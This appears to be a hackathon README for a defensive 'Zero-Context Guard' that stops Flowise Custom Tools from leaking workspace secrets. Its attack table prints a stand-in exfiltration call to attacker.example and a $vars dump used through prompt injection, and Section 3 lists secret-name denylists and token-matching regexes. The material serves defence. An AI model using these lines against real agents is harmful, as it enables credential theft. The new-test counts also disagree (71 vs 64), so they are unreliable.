# Zero-Context Guard for Flowise (IBM Bob Hackathon — Theme 2)

## 1. Project Description (≤100-word submission field)

> Flowise is end-of-life, and its Custom Tools receive every workspace variable,
> including API keys, as plain text; a prompt injection can exfiltrate them. Using
> IBM Bob we audited it (10 findings) and built a Zero-Context Guard: tools call
> `$secureRequest` with a secret name, the backend injects the credential only for
> allow-listed hosts, and real secret values are redacted from outputs and errors.
> Cross-origin redirects strip credentials; DNS rebinding is mitigated. 71 new tests,
> 981 passing, no new dependencies. Limits are documented.

**Word count: 81** ✓ (limit is 100; verified by stripping blockquote markers and backticks, then `wc -w`)

---

## 2. The Problem: Legacy Agent Tools Are a Secret-Exfiltration Vector

Flowise (Apache 2.0, code-frozen 2026-07-29, EOL 2026-08-31) powers LLM agents that call
**Custom Tools** — user-written JavaScript executed inside a Node.js VM. Before this
project, every such tool ran with a `$vars` object in scope containing every workspace
variable, including **runtime variables resolved from `process.env`**. The LLM chooses
which tool to call and what arguments to pass; it can also inject adversarial content via
tool arguments.

This creates a direct, confirmed path to [OWASP LLM02:2025 — Sensitive Information Disclosure][llm02]:

| Attack                   | One-line repro                                                                                                                          |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Direct exfiltration**  | Tool code: `return JSON.stringify($vars)` → LLM receives all secrets as a ToolMessage.                                                  |
| **E2B remote leak**      | `$vars` is serialised as `const $vars = {...}` and sent to a third-party VM at e2b.dev where the sandbox can `fetch` any URL.           |
| **SSRF bypass via E2B**  | The NodeVM SSRF deny list is not applied inside E2B. Sandbox code calls native `fetch('https://attacker.example/?k=' + $vars.API_KEY)`. |
| **Error channel leak**   | `JSON.parse($vars.SECRET)` throws; the error message embeds the raw value and is emitted verbatim over SSE.                             |
| **Tracing exfiltration** | LangSmith / LangFuse / Lunary / Arize receive the unredacted tool output through the LangChain callback chain.                          |
| **Runtime env leak**     | A variable named `FLOWISE_SECRETKEY_OVERWRITE` with `type=runtime` places the master encryption key in `$vars`.                         |

An IBM Bob Secret Leak Audit ([`docs/AUDIT.md`](AUDIT.md)) traced **10 confirmed findings**
across 4 sinks: LLM context (S1), tool output to LLM (S2), error messages (S3), and
callbacks/traces/logs (S4). All 10 are evidence-backed with file:line citations and
minimal reproductions.

[llm02]: https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/

---

## 3. The Solution: Zero-Context Guard

The guard has two independent layers. Neither introduces new runtime dependencies.

### Layer 1 — Secret Isolation (F-01, F-02, F-03, F-05)

**`$vars` is removed from the sandbox scope when a tool declares secret bindings.**
In its place, an admin-declared `SecretBinding` array maps a short name to a
`credentialId` and an `allowedHosts` list. At call time the guard builds a
`$secureRequest` closure and injects it:

```
SecretBinding {
  name:         "github"               // only thing the LLM or sandbox sees
  credentialId: "cred-uuid-…"          // stays in the host process, never in sandbox
  allowedHosts: ["api.github.com"]     // exact-hostname check, no substring match
}
```

**Data flow:**

```
LLM calls tool
  → _call() in core.ts
      → makeSecureRequestHelper(bindings, options)   [guardRequest.ts]
          → returns $secureRequest closure (never enters sandbox as data)
      → createCodeExecutionSandbox(..., secureRequestHelper)
          → sandbox.$secureRequest = closure
          → sandbox.$vars = *** ABSENT ***
      → executeJavaScriptCode(code, sandbox, { disableE2B: true })

Sandbox code calls:  $secureRequest('github', 'https://api.github.com/user', {})
  → closure runs IN THE HOST PROCESS:
      1. getCredentialData('cred-uuid-…')   → raw token (never touches sandbox)
      2. hostname check: 'api.github.com' ∈ allowedHosts ✓
      3. secureAxiosSingleHop({url, headers: {Authorization: 'Bearer <token>'}})
           ↳ DNS resolved once → IP validated against SSRF deny list → IP pinned
             into http.Agent (eliminating DNS-rebinding TOCTOU window)
           ↳ allowedHosts re-checked on every redirect hop  [guardRequest.ts]
      4. returns clean response body string to sandbox
```

Tools without `secretBindings` are **unchanged** — `$vars` remains in scope, E2B is used
if configured, the sandbox behaves exactly as it did before.

**Runtime environment variable denylist (F-03):** `prepareSandboxVars` now skips any
`runtime`-type variable whose name matches patterns like `SECRET`, `KEY`, `TOKEN`,
`PASSWORD`, `FLOWISE_`, `ENCRYPTION`, etc. This closes the worst-case path
(`FLOWISE_SECRETKEY_OVERWRITE` → master key in `$vars`) globally, for every node type.

### Layer 2 — Redaction Middleware (F-04, F-06, F-08)

**`redact(text, resolvedSecrets)` in [`guardRedact.ts`](../packages/components/src/guardRedact.ts)**
is a pure function applied at every boundary where strings leave the process:

| Applied at                                     | Protects against                                              |
| ---------------------------------------------- | ------------------------------------------------------------- |
| `DynamicStructuredTool._call()` return value   | F-04 — static patterns + resolved credential values in output |
| `DynamicStructuredTool._call()` catch block    | F-06 — static patterns + resolved values in error messages    |
| `CustomStreamingHandler.handleToolEnd()`       | F-04 — SSE `agent_trace` stream — static patterns only        |
| `CustomStreamingHandler.handleToolError()`     | F-06 — SSE error payload — static patterns only               |
| `ConsoleCallbackHandler.onToolEnd/onToolError` | F-08 — server logs at verbose level — static patterns only    |

Static patterns caught without needing resolved secrets:

| Pattern                               | Catches                               |
| ------------------------------------- | ------------------------------------- |
| `sk-[A-Za-z0-9_-]{10,}`               | OpenAI API keys                       |
| `ghp_[A-Za-z0-9]{10,}`                | GitHub personal access tokens         |
| `Bearer\s+(?!\[REDACTED)[^\s"',]{8,}` | Any Bearer authorization header value |
| `xoxb-[0-9A-Za-z-]{10,}`              | Slack bot tokens                      |
| `AIza[0-9A-Za-z_-]{35}`               | Google API keys                       |

A negative lookahead on the Bearer pattern prevents double-redaction when an earlier
resolved-secret pass already replaced the token with `[REDACTED]`.

---

## 4. Improvements Made

| #   | Area                                                                             | Before                                                                       | After                                                                                                                      | Finding    | Status                              |
| --- | -------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- | ---------- | ----------------------------------- |
| 1   | Sandbox scope                                                                    | `$vars` with all secrets in scope (E2B + NodeVM)                             | `$vars` absent when `secretBindings` declared; `$secureRequest` injected instead                                           | F-01, F-02 | ✅ Closed (requires secretBindings) |
| 2   | E2B remote VM                                                                    | Full `$vars` serialised as `const $vars = {...}` and sent to e2b.dev         | E2B disabled for tools with secret bindings; NodeVM path used                                                              | F-01, F-05 | ✅ Closed (requires secretBindings) |
| 3   | SSRF in E2B                                                                      | No deny-list enforcement; sandbox called native `fetch` freely               | Blocked entirely — only `secureAxiosSingleHop` path available for binding tools                                            | F-05       | ✅ Closed (requires secretBindings) |
| 4   | Runtime env vars                                                                 | Any `process.env` key accessible via `runtime` variable                      | 14-pattern denylist blocks `SECRET`, `KEY`, `TOKEN`, `PASSWORD`, `FLOWISE_`, etc. globally                                 | F-03       | ✅ Closed (global)                  |
| 5   | Tool output to LLM (binding tools)                                               | Raw output (potentially containing secrets) returned as ToolMessage          | `redact(result, resolvedSecretValues)` in `_call()` — static patterns + resolved credential values                         | F-04       | ✅ Closed (requires secretBindings) |
| 6   | Error messages (binding tools)                                                   | `NodeVM Execution Error: <original error>` could embed raw secret values     | `redact(error, resolvedSecretValues)` before re-throw — static patterns + resolved values                                  | F-06       | ✅ Closed (requires secretBindings) |
| 7   | SSE `agent_trace` stream                                                         | Raw tool output and error message emitted verbatim                           | `redact(output, [])` in `handleToolEnd` / `handleToolError` — static patterns only                                         | F-04, F-06 | ⚠️ Partial (static patterns only)   |
| 8   | Server logs                                                                      | `logger.verbose` received raw tool output at `DEBUG=true`                    | `redact(output, [])` in `onToolEnd` / `onToolError` — static patterns only                                                 | F-08       | ⚠️ Partial (static patterns only)   |
| 9   | Outbound HTTP from sandbox                                                       | Sandbox could call `$vars.API_KEY` in headers; no server-side auth injection | Auth header injected by host process; sandbox never receives token value                                                   | F-05       | ✅ Closed (requires secretBindings) |
| 10  | Redirect cross-origin credential forwarding                                      | Authorization/Cookie forwarded on any redirect, even cross-origin            | Sensitive headers stripped when redirect changes **full origin (scheme+hostname+port)**; `allowedHosts` re-checked per hop | (new)      | ✅ Closed                           |
| 11  | DNS-rebinding TOCTOU window                                                      | `checkDenyList` + `axios` resolved hostname twice; IP could change between   | `secureAxiosSingleHop` pins validated IP into `http.Agent`; DNS resolved once per hop                                      | (new)      | ✅ Closed                           |
| 12  | Resolved-secret redaction                                                        | `redact()` called with `[]`; custom secrets not caught                       | `onSecretResolved` callback populates `resolvedSecretValues`; real values passed to `redact()`                             | F-04, F-06 | ✅ Closed (requires secretBindings) |
| 13  | Tracing providers (LangSmith, LangFuse, Lunary, Arize, Phoenix, LangWatch, Opik) | Received full unredacted tool output via LangChain callback chain            | Static-pattern redaction in `_call()` only; tracers receive `Run` objects directly from LangChain — not mitigated          | F-10       | ⚠️ Not closed (see §6)              |
| 14  | `$vars` in other node types                                                      | `$vars` with sensitive runtime vars in LLMNode / Agent / Condition scopes    | Worst-case names blocked by denylist; full `$vars` removal deferred                                                        | F-07, F-09 | ⚠️ Partial (denylist only)          |

### Upstream bug fixed

`createPinnedAgent` in the upstream Flowise codebase (confirmed against `upstream/main`)
used the scalar callback form `cb(null, address, family)` in the custom `lookup` function.
Node's `http.Agent` calls custom `lookup` functions with `{ all: true }` when requesting
all addresses, at which point the callback contract changes to the array form
`cb(null, [{address, family}])`. Passing scalars in that case causes Node's internals to
call `ipaddr.parse(undefined)` → `"Invalid IP address: undefined"`, making
`secureAxiosRequest` fail for any URL with a hostname. Observed on Node v24.11.0; the
`{ all: true }` behaviour has been present since at least Node v12.

Fix: [`httpSecurity.ts`](../packages/components/src/httpSecurity.ts) — `createPinnedAgent`
checks `opts.all` and returns the array form when required. Covered by 4 integration tests
with real TCP servers ([`httpSecurity.pinnedAgent.test.ts`](../packages/components/src/httpSecurity.pinnedAgent.test.ts)).

### What did not change

-   Any Custom Tool with **no** `secretBindings` field behaves identically to before,
    except that secret-named runtime variables (matching 14 key patterns: `SECRET`, `KEY`,
    `TOKEN`, `PASSWORD`, `FLOWISE_`, etc.) are now filtered out of `$vars` globally (F-03).
-   All 910 pre-existing tests pass without modification.
-   Zero new runtime npm dependencies added.
-   The SSRF deny list, NodeVM `axios`/`node-fetch` wrappers, and `secureAxiosRequest`
    are unchanged and continue to protect non-guard tools.

---

## 5. Run the Demo

No server, no credentials, no setup — just Node ≥ 20 and a cloned repo.

```bash
# Show attacks using ORIGINAL upstream Flowise code (commit 9291856d):
#   Attack 1: $vars exfiltration — LLM receives all workspace secrets
#   Attack 2: Authorization header forwarded on same-hostname/different-port redirect
#             (upstream has NO cross-origin header-stripping logic)
bash demo/before.sh
# Expected: runs in < 40 s; prints ⚠️ for each demonstrated leak; exits 0

# Show all defences live against real TCP servers (our fixed code)
bash demo/after.sh
# Expected: runs in < 40 s; prints ✅ for each defence; exits 0
#   Defence 1:  $vars absent; resolved values redacted from output
#   Defence 2a: allowedHosts blocks initial call to non-allowed host
#   Defence 2b: live redirect (localhost:4001 → 127.0.0.1:4002) blocked at hop 1
#   Defence 3:  cross-host redirect strips Authorization
#   Defence 3a: same-hostname/different-port redirect strips Authorization
#               (same request as before.sh Attack 2 — now fixed by origin-based check)
#   Defence 3b: same-origin redirect keeps Authorization (precision)
```

Both scripts set `HTTP_SECURITY_CHECK=false` internally (loopback allowed inside the demo
process only) and enforce a 30-second hard timeout. After they exit, no processes linger.

---

## 6. Known Limitations

| Limitation                              | Affected findings            | Detail                                                                                                                                                                                                                                                                                                                              |
| --------------------------------------- | ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **F-10: tracing providers not covered** | F-10                         | LangSmith, LangFuse, Lunary, Arize, Phoenix, LangWatch, and Opik receive `Run` objects from LangChain's own callback chain — independently of `CustomStreamingHandler`. Static-pattern redaction in `_call()` catches known token formats; a custom credential that matches no static pattern will reach all 7 providers verbatim.  |
| **F-07/F-09: other node types**         | F-07, F-09                   | `$vars` is still present in LLMNode, Agent, ConditionAgent, Condition, ToolNode, and ChatPromptTemplate sandboxes. The 14-pattern denylist blocks the worst-case keys (`FLOWISE_SECRETKEY_OVERWRITE`, `OPENAI_API_KEY`, etc.) globally, but non-blocked names remain accessible. Full `$vars` removal from these nodes is deferred. |
| **Secrets < 8 chars not redacted**      | F-04, F-06                   | `guardRedact.ts` sets `MIN_SECRET_LENGTH = 8` to avoid false positives.                                                                                                                                                                                                                                                             |
| **No base64 / URL-encoded variants**    | F-04, F-06                   | Redaction operates on plaintext only.                                                                                                                                                                                                                                                                                               |
| **Legacy tools (no secretBindings)**    | F-01, F-02, F-04, F-05, F-06 | All Guard protections require the admin to declare `secretBindings`. Tools without bindings continue to receive `$vars`.                                                                                                                                                                                                            |

---

## 7. How IBM Bob Was Used

Bob was not used to search the web or generate prose. It was used as an active engineering
participant on a live codebase, in structured modes, with every claim grounded in file:line
evidence.

### Session 1 — Baseline (Agent mode)

Bob ran `node --version`, `pnpm install`, `pnpm build`, and the full test suite, then wrote
[`docs/BASELINE.md`](BASELINE.md) recording Node v24.11.0, pnpm 10.30.3, build 6/6,
910 tests passing, 0 pre-existing failures. This established a clean reference point before
any source changes.

### Session 2 — Audit (Secret Leak Auditor mode)

Bob read and traversed the following files **without any guessing**:

-   [`src/utils.ts`](../packages/components/src/utils.ts) — `getCredentialData`, `prepareSandboxVars`, `createCodeExecutionSandbox`, `executeJavaScriptCode` (E2B and NodeVM branches)
-   [`nodes/tools/CustomTool/core.ts`](../packages/components/nodes/tools/CustomTool/core.ts) — `DynamicStructuredTool.call()`, `_call()`
-   [`src/handler.ts`](../packages/components/src/handler.ts) — `handleToolEnd`, `handleToolError`, `onToolEnd`, `onToolError`, `additionalCallbacks`
-   [`src/httpSecurity.ts`](../packages/components/src/httpSecurity.ts) — `secureAxiosRequest`, `secureFetch`, `checkDenyList`

It produced [`docs/AUDIT.md`](AUDIT.md): 10 confirmed findings (F-01–F-10) with file:line
evidence, severity ratings, minimal reproductions, and 5 disproved claims.

### Session 3 — Design (Plan mode)

Bob authored [`docs/DESIGN.md`](DESIGN.md) — 337 lines covering the `SecretBinding` type,
the full call-time data flow diagram, the E2B strategy, the `BLOCKED_ENV_KEY_PATTERNS`
denylist, the redaction middleware specification, backward compatibility rules, an 8-subtask
breakdown, and an audit traceability table. Three open design questions were raised and
answered explicitly before implementation began.

### Session 4 — Implementation (Guard Engineer mode, TDD)

Bob implemented the guard test-first, in sequential subtasks:

1. Wrote 20 failing tests in [`src/guardRedact.test.ts`](../packages/components/src/guardRedact.test.ts), then implemented [`src/guardRedact.ts`](../packages/components/src/guardRedact.ts). Fixed one real bug discovered mid-cycle: a negative lookahead was needed to prevent the Bearer pattern from re-matching `Bearer [REDACTED]` after a resolved-secret pass.

2. Wrote 13 initial tests in [`src/guardRequest.test.ts`](../packages/components/src/guardRequest.test.ts), then implemented [`src/guardRequest.ts`](../packages/components/src/guardRequest.ts). After self-review, added tests for redirect re-check, cross-host header stripping, `onSecretResolved`, `onAudit`, and origin-based stripping. Final count: 27 tests.

3. Modified [`src/utils.ts`](../packages/components/src/utils.ts): added `BLOCKED_ENV_KEY_PATTERNS`, skip logic in `prepareSandboxVars`, `secureRequestHelper` parameter, and `disableE2B` flag.

4. Modified [`core.ts`](../packages/components/nodes/tools/CustomTool/core.ts) and [`CustomTool.ts`](../packages/components/nodes/tools/CustomTool/CustomTool.ts). Added 6 tests in [`core.test.ts`](../packages/components/nodes/tools/CustomTool/core.test.ts).

5. Modified [`handler.ts`](../packages/components/src/handler.ts): applied `redact()` in all four callback methods.

6. Modified [`httpSecurity.ts`](../packages/components/src/httpSecurity.ts): added `secureAxiosSingleHop` (DNS-pinning closes TOCTOU window), cross-origin redirect header stripping using `urlOrigin()` (scheme+host+port), and the `createPinnedAgent` `opts.all` fix. Added 14 tests to [`httpSecurity.test.ts`](../packages/components/src/httpSecurity.test.ts) and 4 integration tests in [`httpSecurity.pinnedAgent.test.ts`](../packages/components/src/httpSecurity.pinnedAgent.test.ts).

7. Ran full suite: **981 tests, 0 failures, 24 suites** (baseline: 910 / 20 suites). Pre-commit hooks (prettier, eslint, lint-staged) passed automatically.

### Measurable Bob contribution

| Activity                                                            | Bob's role                                                                         | Human role                |
| ------------------------------------------------------------------- | ---------------------------------------------------------------------------------- | ------------------------- |
| Codebase traversal (utils.ts, core.ts, handler.ts, httpSecurity.ts) | Read all files, cited every claim                                                  | None required             |
| Audit table (10 findings, 5 disproved)                              | Authored [`docs/AUDIT.md`](AUDIT.md)                                               | Reviewed                  |
| Architecture design                                                 | Authored [`docs/DESIGN.md`](DESIGN.md)                                             | Signed off on 3 decisions |
| TDD implementation                                                  | Wrote tests first, then implementations                                            | None                      |
| Bug discovery (3)                                                   | Bearer double-redaction; DNS-rebinding TOCTOU; upstream `createPinnedAgent` lookup | None                      |
| Self-review                                                         | Authored [`docs/REVIEW.md`](REVIEW.md); 9 issues found and fixed                   | None                      |
| Test validation                                                     | Ran `jest` after every subtask                                                     | None                      |
| Commit authorship                                                   | Staged, wrote commit messages, committed                                           | None                      |

Every claim in this document is backed by a file in this repository. No numbers were
invented. See [`docs/BOB_LOG.md`](BOB_LOG.md) for the per-session log.

---

## 8. Repository Structure

```
packages/components/
  src/
    guardRedact.ts               ← NEW: pure redact() function (20 tests)
    guardRequest.ts              ← NEW: makeSecureRequestHelper + redirect loop + audit events (25 tests)
    httpSecurity.ts              ← MODIFIED: secureAxiosSingleHop, cross-host strip, lookup fix (9+4 tests)
    utils.ts                     ← MODIFIED: denylist, sandbox flags
    handler.ts                   ← MODIFIED: redact() in 4 callback methods
  nodes/tools/CustomTool/
    core.ts                      ← MODIFIED: secretBindings, $secureRequest wiring (6 tests)
    CustomTool.ts                ← MODIFIED: parse + attach bindings

docs/
  BASELINE.md                    ← pre-change environment + test baseline
  AUDIT.md                       ← 10 confirmed findings, 5 disproved
  DESIGN.md                      ← full technical specification
  REVIEW.md                      ← self-review findings (9 issues, all fixed)
  BOB_LOG.md                     ← per-session IBM Bob usage log

demo/
  before.sh / run-before.ts      ← unguarded attack demo (< 40 s, exits clean)
  after.sh  / run-after.ts       ← guarded defence demo (< 40 s, exits clean)
```

## 9. Running the Tests

```bash
pnpm install
pnpm --filter flowise-components exec jest --ci --forceExit --silent
# Expected: Test Suites: 24 passed, Tests: 981 passed, 0 failed
# Baseline (before guard): 910 tests / 20 suites
# New guard tests: guardRequest=25, guardRedact=20, core=6, httpSecurity=9, pinnedAgent=4 → +64
```

---

## 10. Live Demo

|                 |                                                                                                             |
| --------------- | ----------------------------------------------------------------------------------------------------------- |
| **URL**         | `https://PLACEHOLDER_RENDER_URL.onrender.com` _(update after deploy)_                                       |
| **Login**       | Username: `demo` · Password: _(share with judges only; rotate after judging)_                               |
| **Keys**        | The live instance uses **fake API keys only** (`sk-FAKE-DEMO-0000000000`). No real secrets are stored.      |
| **Rate limits** | The demo agent is configured with a low iteration cap (`maxIterations=3`). No real LLM billing is incurred. |

### What to try

1. **Show the guard:** type `show the guard` in the chat widget — the agent calls
   `secure_echo`. The secret is resolved server-side; the tool's JavaScript sandbox
   never sees the key value.

2. **Show the contrast:** type `show unguarded` — the agent calls `unsafe_vars_dump`.
   The tool can read `$vars` keys (because it has no `secretBindings`), but the values
   are all fake, so nothing real is exposed.

3. **Check the audit log:** in the Flowise server logs (platform → Logs tab), look for
   `[AUDIT]` lines — one per outbound request from the guard, recording
   `{ tool, secretName, host, decision }`. No secret values appear in the log.

### Deploy it yourself

See [`deploy/README.md`](../deploy/README.md) for step-by-step Render and Railway
instructions, the `deploy/render.yaml` Blueprint, and the `deploy/.env.example`
template. Import `demo/chatflow-zero-context-guard.json` after first login.

> Deployment checklist (auth enabled, no real keys, billing limits, password rotation):
> [`docs/DEPLOY_CHECKLIST.md`](DEPLOY_CHECKLIST.md)

---

_Branch: `zero-context-guard` · Latest commit: `c2e3d6c0` · IBM Bob Hackathon 2025 · Theme 2: Modernize What Matters_
